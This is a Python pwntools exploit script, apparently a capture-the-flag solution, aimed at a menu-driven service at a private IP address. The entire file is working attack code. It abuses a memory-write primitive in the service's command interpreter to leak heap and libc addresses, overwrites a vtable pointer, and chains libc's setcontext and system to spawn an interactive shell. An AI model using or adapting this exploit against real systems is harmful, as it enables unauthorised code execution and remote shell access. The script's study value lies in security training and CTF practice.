#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
from pwn import *
import base64
import string
host = "10.211.55.28"
port = 8888




def setax(val):
    oparray = ">"
    oparray += chr(val)
    return oparray

def writemem(offset,val):
    oparray = setax(val)
    oparray += "2"
    oparray += p16(offset)
    return oparray

def loadnode(_id,tok):
    r.recvuntil("4. exit")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(_id)
    r.recvuntil(":")
    r.sendline(tok)

def setnode(_id,tok,cont,cmd):
    r.recvuntil("4. exit")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(_id)
    r.recvuntil(":")
    r.sendline(tok)
    r.recvuntil(":")
    r.sendline(cont)
    r.recvuntil(":")
    r.sendline(base64.b64encode(cmd))

def runcmd(cmd):
    r.recvuntil("4. exit")
    r.sendline("6")
    r.recvuntil(":")
    r.sendline(base64.b64encode(cmd))


def strike():
    r.recvuntil("4. exit")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline("8822114542800170613")



rand_str = lambda n: ''.join([random.choice(string.lowercase) for i in xrange(n)])

r = remote(host,port)
s = rand_str(3)
setnode(s,s,s,"QQ==")
r.close()
r = remote(host,port)
loadnode(s,s)
loadnode(s,s)
loadnode(s,s)

s = rand_str(10)
cmd = writemem(0xfff8,0x50)
setnode(s,s,s,cmd)
strike()
r.recvuntil("objectives:\n")
data = r.recvuntil(",")[:-1].strip()
heap = u64(data.ljust(8,"\x00")) - 0x80b0
print "heap : " ,hex(heap)

cmd = writemem(0xfff8,0xd8)
s = rand_str(10)
setnode(s,s,s,cmd)
strike()
r.recvuntil("objectives:\n")
data = r.recvuntil(",")[:-1].strip()
stderr = 0x3bf1c0
libc = u64(data.ljust(8,"\x00")) - stderr
print "libc : " ,hex(libc)
vptr = heap + 0x50
cmd = ""
for i in range(6):
    cmd += writemem(0xffe8+i,(vptr >> 8*i) & 0xff)
cmd = cmd.ljust(0x28,"\x00")

s = rand_str(10)
setcontext = libc + 0x47165
system = libc + 0x46590
ret = libc +0x471c0
sh = libc + 0x17c8c3
cmd += "a"*8 + p64(setcontext)
cmd = cmd.ljust(0x68-0x18,"d") + p64(sh)
cmd = cmd.ljust(0xa0-0x18,"d") + p64(heap+0x5b0) +p64(system) 
setnode(s,s,s,cmd)

r.interactive()
